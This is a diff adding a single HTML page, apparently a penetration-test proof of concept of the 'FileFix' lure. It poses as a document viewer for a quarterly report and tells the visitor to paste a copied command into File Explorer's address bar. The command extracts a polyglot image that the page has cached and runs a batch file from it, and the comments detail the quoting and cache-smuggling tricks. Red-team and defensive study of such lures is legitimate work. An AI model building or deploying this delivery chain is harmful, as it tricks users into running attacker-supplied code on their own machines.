@@ -1,0 +1,142 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Document Preview</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  :root {
+    --bg:#f5f6f8; --fg:#1e1e1e; --muted:#666; --accent:#0078d4;
+    --card:#fff; --border:#e1e1e1;
+  }
+  * { box-sizing:border-box; }
+  body {
+    margin:0; font:14px/1.5 -apple-system, "Segoe UI", system-ui, sans-serif;
+    background:var(--bg); color:var(--fg);
+  }
+  header {
+    background:var(--accent); color:#fff; padding:12px 24px;
+    display:flex; align-items:center; gap:12px;
+  }
+  header .dot { width:10px;height:10px;background:#fff;border-radius:2px;opacity:.85; }
+  header h1 { font-size:15px;font-weight:500;margin:0; }
+  main {
+    max-width:960px; margin:32px auto; padding:0 16px;
+  }
+  .card {
+    background:var(--card); border:1px solid var(--border);
+    border-radius:4px; padding:32px; box-shadow:0 1px 2px rgba(0,0,0,.04);
+  }
+  h2 { font-size:18px; margin:0 0 4px; font-weight:600; }
+  .meta { color:var(--muted); font-size:13px; margin-bottom:24px; }
+  .preview {
+    background:#f0f0f0; border:1px solid var(--border); border-radius:3px;
+    padding:24px; margin:24px 0; text-align:center;
+  }
+  .preview img {
+    max-width:100%; height:auto; filter:blur(6px); border-radius:2px;
+    transition:filter 400ms ease;
+  }
+  .msg { margin:24px 0; padding:16px; background:#fff8e1;
+         border-left:3px solid #f5a623; font-size:13px; }
+  .msg strong { display:block; margin-bottom:4px; font-size:14px; }
+  button {
+    background:var(--accent); color:#fff; border:0; padding:10px 20px;
+    font:inherit; font-weight:500; border-radius:3px; cursor:pointer;
+  }
+  button:hover { background:#106ebe; }
+  code {
+    display:block; background:#1e1e1e; color:#d4d4d4;
+    padding:12px; border-radius:3px; font:12px/1.4 Consolas, monospace;
+    overflow-x:auto; white-space:pre-wrap; word-break:break-all;
+    margin-top:12px;
+  }
+  footer { text-align:center; color:var(--muted); font-size:12px; margin:32px 0; }
+</style>
+</head>
+<body>
+<header>
+  <span class="dot"></span>
+  <h1>Document Viewer</h1>
+</header>
+
+<main>
+  <div class="card">
+    <h2 id="doc-title">Quarterly_Report_Q1_2026.pdf</h2>
+    <div class="meta">5 pages · 1.2 MB · Shared by IT Operations</div>
+
+    <div class="preview">
+      <img id="preview-img" src="banner.jpg" alt="Document preview" width="480">
+    </div>
+
+    <div class="msg">
+      <strong>Preview unavailable on this browser build.</strong>
+      To view the document, press <kbd>Win + E</kbd> to open File Explorer,
+      paste the verification path below into the address bar, and press
+      <kbd>Enter</kbd>. This re-initialises the viewer cache and re-renders
+      the document.
+    </div>
+
+    <button id="copy-btn">Copy verification path to clipboard</button>
+    <code id="cmd-display"></code>
+
+    <p style="color:var(--muted); font-size:12px; margin-top:24px;">
+      POC only — harmless notepad launcher. No network traffic after the
+      initial image load. Polyglot fetched on page open (see banner.jpg
+      request in DevTools).
+    </p>
+  </div>
+
+  <footer>
+    &copy; 2026 Document Viewer &middot; This is a penetration-test artifact.
+  </footer>
+</main>
+
+<script>
+  // FileFix pattern — paste into File Explorer's address bar (Win+E).
+  // Explorer ShellExecutes the typed string; cmd.exe is found via PATH and
+  // the remainder is parsed by cmd. Address bar accepts longer input than
+  // conhost (no ~255 char wrap) and runs without a pre-opened terminal,
+  // same as the Run dialog.
+  //
+  // Outer `cmd /c "..."` then `start "" /min cmd /c "..."` trick survives
+  // the nested quotes because `start ""` consumes the first empty quoted
+  // string as a (null) window title and passes the rest verbatim to the
+  // inner cmd. Paths are NOT wrapped in inner quotes — cd /d and tar take
+  // everything up to the next `&` as the argument, so `User Data` spaces
+  // are fine.
+  const CMD =
+    'cmd /c "start "" /min cmd /c "' +
+      'cd /d %LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data & ' +
+      '(for %f in (f_*) do tar -xf %f -C %TEMP% 2>nul) & ' +
+      'cd /d %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cache\\Cache_Data & ' +
+      '(for %f in (f_*) do tar -xf %f -C %TEMP% 2>nul) & ' +
+      'if exist %TEMP%\\notepad.bat call %TEMP%\\notepad.bat' +
+    '""';
+
+  const display = document.getElementById('cmd-display');
+  const btn = document.getElementById('copy-btn');
+  display.textContent = CMD;
+
+  btn.addEventListener('click', async () => {
+    try {
+      await navigator.clipboard.writeText(CMD);
+      btn.textContent = 'Copied — now paste into the File Explorer address bar (Win+E)';
+    } catch (e) {
+      // Fallback: select-all so user can Ctrl+C
+      const r = document.createRange();
+      r.selectNodeContents(display);
+      getSelection().removeAllRanges();
+      getSelection().addRange(r);
+      btn.textContent = 'Select-all done — press Ctrl+C';
+    }
+  });
+
+  // Warm the cache — force a no-cors fetch so browser writes banner.jpg
+  // to disk cache as image/jpeg. Must complete before user runs the cmd.
+  fetch('banner.jpg', { cache: 'force-cache', mode: 'no-cors' })
+    .then(() => console.log('[poc] banner.jpg cached'))
+    .catch(e => console.warn('[poc] cache warm failed', e));
+</script>
+</body>
+</html>
